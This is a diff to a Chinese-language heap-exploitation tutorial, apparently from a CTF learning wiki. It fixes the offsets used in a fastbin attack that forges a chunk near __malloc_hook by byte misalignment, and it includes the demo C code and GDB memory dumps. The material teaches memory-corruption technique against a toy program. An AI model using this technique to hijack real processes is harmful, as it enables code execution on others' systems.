@@ -467,13 +467,13 @@ int main(void)
     
     free(chunk1);
     
-    *(long long *)chunk1=0x7ffff7dd1b05;
+    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
     malloc(0x60);
     chunk_a=malloc(0x60);
     return 0;
 }
 ```
-这里的0x7ffff7dd1b05是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。
+这里的0x7ffff7dd1af5是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。
 ```
 0x7ffff7dd1a88 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
 0x7ffff7dd1a90 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
@@ -518,20 +518,23 @@ Fastbins[idx=6, size=0x70]
 ##define fastbin_index(sz)                                                      \
     ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
 ```
+（注意sz的大小是unsigned int，因此只占4个字节）
+
 
 而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。
-最后经过两次分配可以观察到 chunk 被分配到 0x00007ffff7dd1b15，因此我们就可以直接控制 __malloc_hook的内容。
+最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook的内容(在我的libc中__realloc_hook与__malloc_hook是在连在一起的)。
 
 ```
 0x4005a8 <main+66>        call   0x400450 <malloc@plt>
  →   0x4005ad <main+71>        mov    QWORD PTR [rbp-0x8], rax
  
- $rax   : 0x00007ffff7dd1b15 
+ $rax   : 0x7ffff7dd1afd 
  
-0x7ffff7dd1b05 <__memalign_hook+5>:	0xfff7a92a0000007f	0x000000000000007f
-0x7ffff7dd1b15 <__malloc_hook+5>:	0x0000000000000000	0x0000000000000000
-0x7ffff7dd1b25 <main_arena+5>:	0x0000000000000000	0x0000000000000000
-0x7ffff7dd1b35 <main_arena+21>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
+0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
+0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
+0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
+
 ```
 
 
